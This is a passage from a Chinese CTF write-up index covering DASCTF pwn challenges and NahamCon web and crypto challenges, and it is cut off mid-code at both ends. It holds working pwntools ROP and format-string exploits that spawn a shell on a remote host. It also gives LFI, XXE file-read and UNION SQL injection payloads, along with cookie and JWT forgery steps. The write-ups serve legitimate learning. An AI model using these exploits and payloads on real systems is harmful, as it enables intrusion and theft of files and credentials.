\u2161"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#memory-mosteriii","text":"\u539f\u7406\u548c\u4e0a\u4e00\u9898\u76f8\u540c\uff0cexp\u4e5f\u662f\u7c7b\u4f3c\uff0c\u53ea\u662fgadget\u6709\u4e00\u70b9\u533a\u522b\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B50B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CA0 rdx_ret = 0x0000000000447635 rsi_ret = 0x0000000000406f70 rdi_ret = 0x0000000000401746 rax_ret = 0x000000000044806c bss = 0x00000000004BD790 + 0x10 read = 0x0000000000447620 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44762c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive ()","title":"Memory Moster\u2162"},{"location":"wp/DASCTF-%E4%BA%94%E6%9C%88%E8%B5%9B/#easybabystack","text":"\u8fd9\u9053\u9898\u5229\u7528\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32*\u7684\u7279\u6027\u3002 *\u53ef\u4ee5\u7528\u53c2\u6570\u6765\u8ba1\u7b97\u5360\u4f4d\u7b26\u7684\u5bbd\u5ea6\u3002\u5982:%*2$c\uff0c\u5c31\u662f\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u6765\u51b3\u5b9a\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u7684\u5bbd\u5ea6\u3002\u5229\u7528\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u5c31\u53ef\u4ee5\u8f93\u51fa\u548ccanary\u4e00\u6837\u5927\u5c0f\u7684\u5b57\u7b26\u8fdb\u800c\u7528%n\u4fee\u6539\u53d8\u91cf\u6765bypass\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10001 ) else : sh = process ( './easybabystack' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x00000000004016C7 # c # ''') start = 0x0000000000401710 pop6_ret = 0x00000000040172A read_plt = 0x0000000000404038 bss = 0x00000000004040C8 + 0x10 system = 0x000000000401040 rdi_ret = 0x0000000000401733 def make_payload ( rdi , rsi , rdx , addr ): p = p64 ( pop6_ret ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) + p64 ( addr ) p += p64 ( start ) + p64 ( 0 ) * 7 return p sh . recvuntil ( 'name:' ) sh . sendline ( '%*18$c%5$n' ) sh . recvuntil ( 'passwd:' ) a = 0xfe sh . sendline ( str ( a )) sh . recvuntil ( 'message:' ) payload = 'a' * 0x118 payload += make_payload ( 0 , bss , 0x10 , read_plt ) payload += p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) sh . sendline ( payload ) sh . interactive ()","title":"easybabystack"},{"location":"wp/NahamConCTF/","text":"\u8fd9\u573a\u6bd4\u8d5b\u56e0\u4e3a\u65f6\u95f4\u95ee\u9898\u53ea\u505a\u4e86\u4e0d\u5230\u4e00\u5929\uff0c\u9898\u76ee\u6bd4\u8f83\u7b80\u5355\uff0c\u6765\u81eactftime Web \u00b6 Agent 95 \u00b6 \u7b7e\u5230\u9898\uff0c\u53ea\u9700\u8981\u6539\u4e00\u4e0b**User-Agent**\u5373\u53ef\uff0c\u9898\u76ee\u8bf4\u662f95\uff0cgoogle\u4e00\u4e0b\u5c31\u77e5\u9053\u662fWindows 95\uff0c\u4fee\u6539\u4e00\u4e0b\u5373\u53ef\u3002 Localghost \u00b6 \u5728\u6e90\u7801\u53d1\u73b0\u6709\u5947\u602a\u7684**js**\u6587\u4ef6\uff0c\u62ff\u4e0b\u6765\u89e3\u5bc6\u4e00\u4e0b\uff1a var _0xbcec = [ \"\\x75\\x73\\x65\\x20\\x73\\x74\\x72\\x69\\x63\\x74\" , \"\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x3C\\x73\\x6D\\x61\\x6C\\x6C\\x3E\\x4C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x2E\\x2E\\x2E\\x3C\\x2F\\x73\\x6D\\x61\\x6C\\x6C\\x3E\" , \"\\x61\\x3A\\x6C\\x61\\x73\\x74\" , \"\" , \"\\x66\\x6C\\x61\\x67\" , \"\\x53\\x6B\\x4E\\x55\\x52\\x6E\\x74\\x7A\\x63\\x47\\x39\\x76\\x62\\x32\\x39\\x76\\x61\\x33\\x6C\\x66\\x5A\\x32\\x68\\x76\\x63\\x33\\x52\\x7A\\x58\\x32\\x6C\\x75\\x58\\x33\\x4E\\x30\\x62\\x33\\x4A\\x68\\x5A\\x32\\x56\\x39\" , \"\\x73\\x65\\x74\\x49\\x74\\x65\\x6D\" , \"\\x6C\\x6F\\x63\\x61\\x6C\\x53\\x74\\x6F\\x72\\x61\\x67\\x65\" , \"\\x64\\x61\\x74\\x61\" , \"\\x66\\x75\\x6E\\x63\\x74\\x69\\x6F\\x6E\" , \"\\x64\\x65\\x66\\x61\\x75\\x6C\\x74\\x73\" , \"\\x65\\x78\\x74\\x65\\x6E\\x64\" , \"\\x6F\\x76\\x65\\x72\\x66\\x6C\\x6F\\x77\\x2D\\x79\" , \"\\x63\\x73\\x73\" , \"\\x76\\x69\\x73\\x69\\x62\\x6C\\x65\" , \"\\x66\\x69\\x72\\x73\\x74\" , \"\\x6E\\x65\\x78\\x74\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\" , \"\\x66\\x69\\x6E\\x64\" , \"\\x62\\x6F\\x64\\x79\" , \"\\x68\\x72\\x65\\x66\" , \"\\x61\\x74\\x74\\x72\" , \"\\x20\" , \"\\x63\\x6F\\x6E\\x74\\x65\\x6E\\x74\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\" , \"\\x74\\x72\\x69\\x6D\" , \"\\x73\\x72\\x63\" , \"\\x69\\x6D\\x67\" , \"\\x66\\x69\\x6C\\x74\\x65\\x72\" , \"\\x6C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x48\\x74\\x6D\\x6C\" , \"\\x6C\\x65\\x6E\\x67\\x74\\x68\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\\x22\\x20\\x2F\\x3E\" , \"\\x77\\x72\\x61\\x70\\x41\\x6C\\x6C\" , \"\\x63\\x6F\\x6E\\x74\\x65\\x6E\\x74\\x73\" , \"\\x70\\x61\\x67\\x69\\x6E\\x67\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\" , \"\\x68\\x69\\x64\\x65\" , \"\\x63\\x6C\\x6F\\x73\\x65\\x73\\x74\" , \"\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6E\\x65\\x78\\x74\\x2D\\x70\\x61\\x72\\x65\\x6E\\x74\" , \"\\x61\\x64\\x64\\x43\\x6C\\x61\\x73\\x73\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\\x2C\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\" , \"\\x6E\\x6F\\x74\" , \"\\x70\\x61\\x72\\x65\\x6E\\x74\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6E\\x65\\x78\\x74\\x2D\\x70\\x61\\x72\\x65\\x6E\\x74\\x22\\x20\\x2F\\x3E\" , \"\\x77\\x72\\x61\\x70\" , \"\\x75\\x6E\\x77\\x72\\x61\\x70\" , \"\\x63\\x68\\x69\\x6C\\x64\\x72\\x65\\x6E\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\" , \"\\x72\\x65\\x6D\\x6F\\x76\\x65\\x44\\x61\\x74\\x61\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x75\\x6E\\x62\\x69\\x6E\\x64\" , \"\\x64\\x69\\x76\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x69\\x6E\\x6E\\x65\\x72\" , \"\\x62\\x6F\\x72\\x64\\x65\\x72\\x54\\x6F\\x70\\x57\\x69\\x64\\x74\\x68\" , \"\\x70\\x61\\x64\\x64\\x69\\x6E\\x67\\x54\\x6F\\x70\" , \"\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x54\\x6F\\x70\" , \"\\x74\\x6F\\x70\" , \"\\x6F\\x66\\x66\\x73\\x65\\x74\" , \"\\x68\\x65\\x69\\x67\\x68\\x74\" , \"\\x63\\x65\\x69\\x6C\" , \"\\x77\\x61\\x69\\x74\\x69\\x6E\\x67\" , \"\\x70\\x61\\x64\\x64\\x69\\x6E\\x67\" , \"\\x6F\\x75\\x74\\x65\\x72\\x48\\x65\\x69\\x67\\x68\\x74\" , \"\\x69\\x6E\\x66\\x6F\" , \"\\x6A\\x53\\x63\\x72\\x6F\\x6C\\x6C\\x3A\" , \"\\x66\\x72\\x6F\\x6D\\x20\\x62\\x6F\\x74\\x74\\x6F\\x6D\\x2E\\x20\\x4C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x20\\x6E\\x65\\x78\\x74\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2E\\x2E\\x2E\" , \"\\x6E\\x65\\x78\\x74\\x48\\x72\\x65\\x66\" , \"\\x77\\x61\\x72\\x6E\" , \"\\x6A\\x53\\x63\\x72\\x6F\\x6C\\x6C\\x3A\\x20\\x6E\\x65\\x78\\x74\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\\x20\\x6E\\x6F\\x74\\x20\\x66\\x6F\\x75\\x6E\\x64\\x20\\x2D\\x20\\x64\\x65\\x73\\x74\\x72\\x6F\\x79\\x69\\x6E\\x67\" , \"\\x61\\x75\\x74\\x6F\\x54\\x72\\x69\\x67\\x67\\x65\\x72\" , \"\\x61\\x75\\x74\\x6F\\x54\\x72\\x69\\x67\\x67\\x65\\x72\\x55\\x6E\\x74\\x69\\x6C\" , \"\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x62\\x69\\x6E\\x64\" , \"\\x63\\x6C\\x69\\x63\\x6B\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x22\\x3E\" , \"\\x3C\\x2F\\x64\\x69\\x76\\x3E\" , \"\\x68\\x74\\x6D\\x6C\" , \"\\x6C\\x61\\x73\\x74\" , \"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\\x22\\x20\\x2F\\x3E\" , \"\\x61\\x70\\x70\\x65\\x6E\\x64\" , \"\\x65\\x72\\x72\\x6F\\x72\" , \"\\x72\\x65\\x6D\\x6F\\x76\\x65\" , \"\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x6E\\x65\\x78\\x74\\x2D\\x70\\x61\\x72\\x65\\x6E\\x74\" , \"\\x63\\x61\\x6C\\x6C\\x62\\x61\\x63\\x6B\" , \"\\x63\\x61\\x6C\\x6C\" , \"\\x64\\x69\\x72\" , \"\\x6C\\x6F\\x61\\x64\" , \"\\x64\\x69\\x76\\x2E\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\\x2D\\x61\\x64\\x64\\x65\\x64\" , \"\\x61\\x6E\\x69\\x6D\\x61\\x74\\x65\" , \"\\x64\\x65\\x62\\x75\\x67\" , \"\\x6F\\x62\\x6A\\x65\\x63\\x74\" , \"\\x61\\x70\\x70\\x6C\\x79\" , \"\\x6C\\x6F\\x67\" , \"\\x73\\x6C\\x69\\x63\\x65\" , \"\\x70\\x72\\x6F\\x74\\x6F\\x74\\x79\\x70\\x65\" , \"\\x66\\x6E\" , \"\\x69\\x6E\\x69\\x74\\x69\\x61\\x6C\\x69\\x7A\\x65\\x64\" , \"\\x65\\x61\\x63\\x68\" ]; for ( var i = 0 ; i < _0xbcec . length ; i ++ ){ console . log ( _0xbcec [ i ]); } flag\u5c31\u5728\u91cc\u9762\u3002 Phphonebook \u00b6 \u663e\u793a\uff1a Sorry! You are in /index.php/?file= The phonebook is located at phphonebook.php \u660e\u663e\u7684\u6587\u4ef6\u5305\u542b\uff0c\u7528\u4f2a\u534f\u8bae\u8bfb\u53d6phponebook.php\u3002 ?file=php://filter/read=convert.base64-encode/resource=phphonebook.php phponebook.php\uff1a <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"utf-8\"> <title>Phphonebook</title> <link href=\"main.css\" rel=\"stylesheet\"> </head> <body class=\"bg\"> <h1 id=\"header\"> Welcome to the Phphonebook </h1> <div id=\"im_container\"> <img src=\"book.jpg\" width=\"50%\" height=\"30%\"/> <p class=\"desc\"> This phphonebook was made to look up all sorts of numbers! Have fun... </p> </div> <br> <br> <div> <form method=\"POST\" action=\"#\"> <label id=\"form_label\">Enter number: </label> <input type=\"text\" name=\"number\"> <input type=\"submit\" value=\"Submit\"> </form> </div> <div id=\"php_container\"> <?php extract ( $_POST ); if ( isset ( $emergency )){ echo ( file_get_contents ( \"/flag.txt\" )); } ?> </div> </br> </br> </br> <div style=\"position:fixed; bottom:1%; left:1%;\"> <br><br><br><br> <b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF! <p> <img width=600px src=\"https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png\"> </p> </div> </body> </html> \u53d8\u91cf\u8986\u76d6\uff0cpost\u4f20\u9012**emergency**\u4efb\u610f\u503c\u5c31\u884c\u3002 Official Business \u00b6 \u7ed9\u4e86\u4e2a\u767b\u5f55\u6846\uff0c\u6e90\u7801\u5728robots.txt\u91cc\u9762\uff1a #!/usr/bin/env python3 from flask import ( Flask , render_template , request , abort , redirect , make_response , g , jsonify , ) import binascii import hashlib import json app = Flask ( __name__ ) app . secret_key = open ( \"secret_key\" , \"r\" ) . read () . strip () FLAG = open ( \"flag.txt\" , \"r\" ) . read () . strip () def do_login ( user , password , admin ): cookie = { \"user\" : user , \"password\" : password , \"admin\" : admin } cookie [ \"digest\" ] = hashlib . sha512 ( app . secret_key + bytes ( json . dumps ( cookie , sort_keys = True ), \"ascii\" ) ) . hexdigest () response = make_response ( redirect ( \"/\" )) response . set_cookie ( \"auth\" , binascii . hexlify ( json . dumps ( cookie ) . encode ( \"utf8\" ))) return response @app . route ( \"/login\" , methods = [ \"POST\" ]) def login (): user = request . form . get ( \"user\" , \"\" ) password = request . form . get ( \"password\" , \"\" ) if ( user != \"hacker\" or hashlib . sha512 ( bytes ( password , \"ascii\" )) . digest () != b \"hackshackshackshackshackshackshackshackshackshackshackshackshack\" ): return abort ( 403 ) return do_login ( user , password , True ) def load_cookie (): cookie = {} auth = request . cookies . get ( \"auth\" ) if auth : try : cookie = json . loads ( binascii . unhexlify ( auth ) . decode ( \"utf8\" )) digest = cookie . pop ( \"digest\" ) if ( digest != hashlib . sha512 ( app . secret_key + bytes ( json . dumps ( cookie , sort_keys = True ), \"ascii\" ) ) . hexdigest () ): return False , {} except : pass return True , cookie @app . route ( \"/logout\" , methods = [ \"GET\" ]) def logout (): response = make_response ( redirect ( \"/\" )) response . set_cookie ( \"auth\" , \"\" , expires = 0 ) return response @app . route ( \"/\" ) def index (): ok , cookie = load_cookie () if not ok : return abort ( 403 ) return render_template ( \"index.html\" , user = cookie . get ( \"user\" , None ), admin = cookie . get ( \"admin\" , None ), flag = FLAG , ) @app . route ( \"/robots.txt\" ) def source (): return \" \" + open(__file__).read() + \" \" if __name__ == \"__main__\" : app . run ( debug = True , host = \"0.0.0.0\" , port = 1337 ) flask\u6a21\u677f\uff0c\u4e3b\u8981\u662f\u6709\u767b\u5f55\u3001\u52a0\u8f7dcookie\u3001index\u7b49\u6a21\u5757\uff0c\u770b\u4e00\u4e0blogin\u65b9\u6cd5\uff0c\u4e3b\u8981\u4ee3\u7801\uff1a if ( user != \"hacker\" or hashlib . sha512 ( bytes ( password , \"ascii\" )) . digest () != b \"hackshackshackshackshackshackshackshackshackshackshackshackshack\" ) sha512\u7684\u7b7e\u540d\u7b97\u6cd5\uff0c\u60f3\u76f4\u63a5\u7206\u7834password\u6765\u5b9e\u73b0\u767b\u5f55\u4e0d\u592a\u53ef\u80fd\u3002\u5728index\u90e8\u5206\u6211\u4eec\u80fd\u53d1\u73b0\uff0c\u8c03\u7528\u4e86**load_cookie**\u5bf9**cookie**\u8fdb\u884c\u4e86\u6821\u9a8c\uff0c\u770b\u4e00\u4e0b**load_cookie**\u90e8\u5206\uff0c\u7531\u4e8e\u5b58\u5728\u672a\u77e5\u5bc6\u94a5\uff1a app . secret_key + bytes ( json . dumps ( cookie , sort_keys = True ), \"ascii\" ) bypass\u4e0d\u592a\u53ef\u80fd\u3002\u5728**do_login**\u90e8\u5206\u53d1\u73b0\u54cd\u5e94\u5305\u662f\u83b7\u53d6cookie\u7684auth\u503c\uff0c\u7531\u4e8e**do_login**\u90e8\u5206\u5e76\u672a\u7528\u5bc6\u94a5\u8fdb\u884c\u9a8c\u8bc1\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4f2a\u9020cookie\uff0c\u6765\u7ed5\u8fc7do_login\u90e8\u5206\uff0c\u5b9e\u73b0admin\u7684\u767b\u5f55\u72b6\u6001\uff0c\u6784\u9020\u811a\u672c\uff1a from flask import ( Flask , render_template , request , abort , redirect , make_response , g , jsonify , ) import binascii import hashlib import json cookie = { \"user\" : 'hacker' , \"password\" : 'sw0r3d' , \"admin\" : True } print ( binascii . hexlify ( json . dumps ( cookie ) . encode ( \"utf8\" ))) \u5728index\u9875\u9762\u6293\u5305\u5728\u8bf7\u6c42\u5934\u589e\u52a0cookie\u7684auth\u503c\u5373\u53ef\u7ed5\u8fc7\u83b7\u5f97flag\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91ccindex\u9875\u9762\u83b7\u53d6user\u548cpass\u90fd\u662f\u4ececookie\u83b7\u53d6\u7684\uff0c\u8ddf\u767b\u5f55\u6846\u7684\u503c\u6ca1\u6709\u5173\u7cfb\uff0c\u4e5f\u5c31\u662f\u4f2a\u9020cookie\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u7528\u6237\u767b\u5f55\u3002 Extraterrestrial \u00b6 \u7ed9\u4e86\u4e2a\u8868\u683c\u8f93\u5165\u6846\uff0c\u5c1d\u8bd5xxs\u548csql\u65e0\u679c\uff0c\u6293\u5305\u5728Accept\u53d1\u73b0\u53ef\u4ee5\u662fxml\u5c5e\u6027\uff0c\u5c1d\u8bd5xml\u6ce8\u5165\uff0c\u7528\u6700\u7b80\u5355\u7684xml\u6a21\u677f\u5373\u53ef\uff1a <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"file:///etc/hosts\"> ]> <sw0r3d> &xxe; </sw0r3d> \u63d0\u793a**The flag is at the *start of the solar system.***\uff0c\u5c1d\u8bd5flag\u3001flag.txt\u7b49\u5173\u952e\u5b57\uff0c\u53d1\u73b0\u662fflag.txt\uff1a <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]> <sw0r3d> &xxe; </sw0r3d> \u5c31\u80fd\u83b7\u5f97flag Rejected Sequel \u00b6 \u7ed9\u4e86\u4e00\u4e2a\u67e5\u8be2\u6846\uff0c\u5728\u6e90\u7801\u53d1\u73b0\u4e86\u5982\u4e0b\u8bed\u53e5\uff1a <!-- if ( isset($_GET[\"debug\"])){ echo($sql_query); } --> \u5e94\u8be5\u662fsql\u6ce8\u5165\uff0c\u800c\u4e14\u7528debug\u53c2\u6570\u53ef\u4ee5\u770b\u5230\u6267\u884c\u7684sql\u8bed\u53e5\uff0c\u901a\u8fc7\u8fd9\u4e2a\u8bed\u53e5\u6211\u4eec\u80fd\u5224\u65ad\u54ea\u4e9b\u654f\u611f\u53c2\u6570\u88ab\u8fc7\u6ee4\u3002\u7b80\u5355\u6d4b\u8bd5\u4e00\u4e0b\u53d1\u73b0\u53ea\u6709\u7a7a\u683c\u88ab\u8fc7\u6ee4\u4e86\uff0c\u53ef\u4ee5\u7528 /**/ \u6216\u8005\u62ec\u53f7\u4ee3\u66ff\uff0c\u7136\u540e\u5c31\u662f\u6700\u7b80\u5355\u7684union\u8054\u5408\u6ce8\u5165\u4e86\u3002\u8fd9\u91cc\u6709\u4e2a\u5c0f\u5751\u70b9\uff0c\u4e00\u822c\u6765\u8bf4\u8bed\u53e5\u90fd\u662f\u901a\u8fc7\u5355\u5f15\u53f7\u95ed\u5408\uff0c\u800c\u8fd9\u91cc\u662f\u4f7f\u7528\u53cc\u5f15\u53f7\u3002\u95ed\u5408\u7684\u65f6\u5019\u6ce8\u610f\u4e00\u4e0b\u5373\u53ef - 1 \"/**/order/**/by/**/1# //\u67e5\u8be2\u5217\u6570\uff0c\u53ea\u6709\u4e00\u5217 -1\" /**/ union /**/ select /**/ database () # // \u67e5\u5e93 res : rejected_sequel - 1 \"/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='rejected_sequel'# //\u8868\u540d res:flag,movies -1\" /**/ union /**/ select /**/ group_concat ( column_name ) /**/ from /**/ information_schema . columns /**/ where /**/ table_name = 'flag' # // \u5b57\u6bb5\u540d res : flag - 1 \" /**/ union /**/ select /**/ flag /**/ from /**/ flag # res : flag { at_least_this_sequel_got_published } Flag Jokes \u00b6 \u9898\u76ee\u63d0\u793a\u9700\u8981\u7528admin\u767b\u5f55\uff0c\u76f4\u63a5\u7528admin\u767b\u5f55\u53d1\u73b0\u6ca1\u6709\u6743\u9650\uff0c\u5148\u5c1d\u8bd5\u5176\u4ed6\u7528\u6237\u540d\uff0c\u6293\u4e2a\u5305\u53d1\u73b0cookie \u628atoken\u5728jwt.io\u4e0a\u89e3\u7801\u5f97\u5230\uff1a \u80fd\u770b\u51fa\u52a0\u5bc6\u7b97\u6cd5\u662frs256\uff0c\u8fd8\u6709\u5947\u602a\u7684jku\u548ckid\u3002\u6839\u636ejku\u7684\u503c\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u5bf9\u5e94\u7f51\u7ad9\u7684jwks.json\u503c \u4f7f\u7528\u7684\u662fRSA\u7b7e\u540d\u7b97\u6cd5\u6765\u8fdb\u884c\u9a8c\u8bc1\uff0c\u7b80\u5355\u6765\u8bf4\u9a8c\u8bc1\u8fc7\u7a0b\u5927\u6982\u901a\u8fc7jku\u7684\u503c\u6765\u5305\u542bjwks.json\uff0c\u901a\u8fc7e\u548cn\u6c42\u51fa\u516c\u94a5\u548c\u79c1\u94a5\uff0c\u7136\u540e\u751f\u6210\u5bf9\u5e94\u7528\u6237\u540d\u7684token\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f2a\u9020json\u7684\u503c\u6765\u7ed5\u8fc7admin\u7684\u767b\u5f55\u9650\u5236\u3002\u56e0\u4e3ajku\u7684\u503c\u53ef\u63a7\uff0c\u4e5f\u5c31\u662f\u7b7e\u540d\u8fc7\u7a0b\u53ef\u63a7\u3002\u7531\u4e8ekid\u503c\u662f\u56fa\u5b9a\u7684\uff0c\u901a\u8fc7kid\u7684\u503c\u5728\u7ebf\u751f\u6210\u79c1\u94a5\u548c\u516c\u94a5\uff0c\u7136\u540e\u5305\u542bvps\u7684jwks.json\u6765\u8fdb\u884c\u9a8c\u8bc1\u3002\uff08\u5177\u4f53\u8fc7\u7a0b\u53c2\u8003\u4e0b\u9762\u94fe\u63a5\uff09 \u5c06\u751f\u6210\u7684jwk\u8f6c\u5316\u4e3apem\u683c\u5f0f( https://8gwifi.org/jwkconvertfunctions.jsp ) \u7136\u540e\u5728vps\u4e0a\u5199\u5165json\uff0c\u4ee5\u4fbfjku\u901a\u8fc7\u9a8c\u8bc1 { \"keys\" : [ { \"kty\" : \"RSA\" , \"e\" : \"AQAB\" , \"use\" : \"sig\" , \"kid\" : \"sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc\" , \"alg\" : \"RS256\" , \"n\" : \"hGDLA-Uhfq7iAWx-TGOi2HlFbPDu7LHqKMI9L0BU2gDQrx-Vbrt6m-6A1rydDEdZtqdhGV_78Y0jA4qXUjQ5rkjVjWLkoDPyT26Fw6TCKCZxmZEPc55d6PBe-if99TD7VaVtnJ8utYaFoHL-UdAXlaI1EOvFmXrBo4SH86PLW6BIniFY7iY0GPFiCC9CBzjJmw9JIkfZNRv-ATn6NhVbgbtXPcUdtlCGS92ho6MRLjLO4O1RzvsBpf2Whq6I2h0NI6y8MVqPSGvnsabVhZWOtauFgu7vm2wr7LM9RYmH4UTtV_mZT5yTPGL2SeWcaldf2QXArKTnzune8n9UMLKkew\" } ] } \u4fee\u6539jku\u548cusername\u7684\u503c\u5373\u53ef\u767b\u5f55admin\u3002 \u5177\u4f53\u53c2\u8003\uff1a https://jwt.io/ https://mkjwk.org/ https://tools.ietf.org/html/rfc7638 https://8gwifi.org/jwkconvertfunctions.jsp https://security.stackexchange.com/questions/167894/rsa-jwk-format-and-parameters-meaning Crypto \u00b6 Docxor \u00b6 \u7ed9\u4e86\u4e2a\u672a\u77e5\u9644\u4ef6\uff0c\u63d0\u793a\u5bc6\u94a5\u662f4\u4e2a\u5b57\u7b26\u3002\u6839\u636e\u9898\u76ee\u540d\u5b57\u5f88\u5bb9\u6613\u5c31\u80fd\u77e5\u9053\u8003\u70b9\uff0c\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662fdoc\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u540e\u9762\u8bd5\u4e86\u8bd5\u53d1\u73b0\u4e0d\u884c\uff0c\u540e\u9762\u5c1d\u8bd5docx\u7684\u6807\u51c6\u683c\u5f0f\u7684\u6587\u4ef6\u5934\u6765\u63a8\u65ad\u51fakey\u3002\u53d1\u73b0\u53ef\u4ee5\uff0c\u6ce8\u610f\u662f\u6807\u51c6\u6587\u4ef6\u5934\uff0c\u4e0d\u7136\u5f88\u5bb9\u6613\u51fa\u9519\u3002\u3002\u3002\u89e3\u5bc6\u5373\u53ef from itertools import * f = open ( 'homework' , 'rb' ) . read () key = [ 90 , 65 , 153 , 187 ] flag = '' for i , j in zip ( f , cycle ( key )): flag += chr ( ord ( i ) ^ j ) with open ( 'flag.docx' , 'wb' ) as f : f . write ( flag ) Homecooked \u00b6 \u76f4\u63a5\u7ed9\u4e86\u4e00\u4e2a\u89e3\u5bc6\u7684py\u6587\u4ef6\uff0c\u4e0d\u8fc7\u8fd0\u884c\u53d1\u73b0\u540e\u9762\u51e0\u4f4d\u4e00\u76f4\u7206\u7834\u4e0d\u51fa\u6765\u3002\u3002\u89c2\u5bdf\u4e00\u4e0b\u4ee3\u7801\uff1a import base64 num = 0 count = 0 cipher_b64 = b 